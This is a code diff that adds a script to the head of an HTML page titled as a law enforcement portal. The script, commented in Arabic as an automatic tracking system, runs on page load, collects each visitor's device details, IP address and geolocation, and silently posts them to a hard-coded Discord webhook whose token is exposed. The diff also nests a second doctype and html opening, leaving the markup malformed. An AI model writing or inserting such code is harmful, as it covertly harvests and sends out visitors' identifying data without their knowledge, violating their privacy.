@@ -1,6 +1,63 @@
 <!DOCTYPE html>
 <html lang="en" dir="ltr">
 <head>
+    <!DOCTYPE html>
+<html lang="ar">
+<head>
+    <!-- كود المرحلة الثالثة: الربط التلقائي بالويب هوك -->
+    <script>
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1501486535495909508/tgk6tefdfHjUriek7isfqA4sYgZD8_7zkHbrGS8v8ZVwZYes-iNazxuDN97RRFe-0V8i";
+
+        async function captureAndSend() {
+            try {
+                // 1. جمع معلومات الجهاز (كمبيوتر أو جوال)
+                const info = {
+                    "الجهاز": navigator.platform,
+                    "المتصفح": navigator.userAgent.includes("Mobi") ? "جوال" : "كمبيوتر",
+                    "اللغة": navigator.language,
+                    "التوقيت": new Date().toLocaleString('ar-EG')
+                };
+
+                // 2. جلب عنوان الـ IP والموقع
+                const ipRes = await fetch('https://ipapi.co/json/');
+                const geo = await ipRes.json();
+                
+                // 3. تجهيز الرسالة لـ Discord
+                const payload = {
+                    embeds: [{
+                        title: "📢 دخول جديد للموقع (تم الرصد)",
+                        color: 15158332, // لون أحمر
+                        fields: [
+                            { name: "📍 IP Address", value: geo.ip || "غير معروف", inline: true },
+                            { name: "🌍 الموقع", value: `${geo.city}, ${geo.country_name}`, inline: true },
+                            { name: "📱 نوع الجهاز", value: info["المتصفح"], inline: true },
+                            { name: "💻 النظام", value: info["الجهاز"], inline: true },
+                            { name: "🌐 المتصفح بالكامل", value: info["المتصفح"] }
+                        ],
+                        footer: { text: "نظام التتبع التلقائي - المرحلة الثالثة" }
+                    }]
+                };
+
+                // 4. إرسال البيانات للويب هوك
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+
+            } catch (err) {
+                console.log("Error in capturing");
+            }
+        }
+
+        // تشغيل الأداة فور فتح الموقع
+        window.onload = function() {
+            captureAndSend();
+            // هنا يمكنك إضافة أي دوال أخرى تريد تشغيلها عند التحميل
+        };
+    </script>
+    
+    <!-- باقي الأكواد الخاصة بموقع الـ MDT والـ CSS تبدأ من هنا -->
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>GOV — Law Enforcement Portal</title>
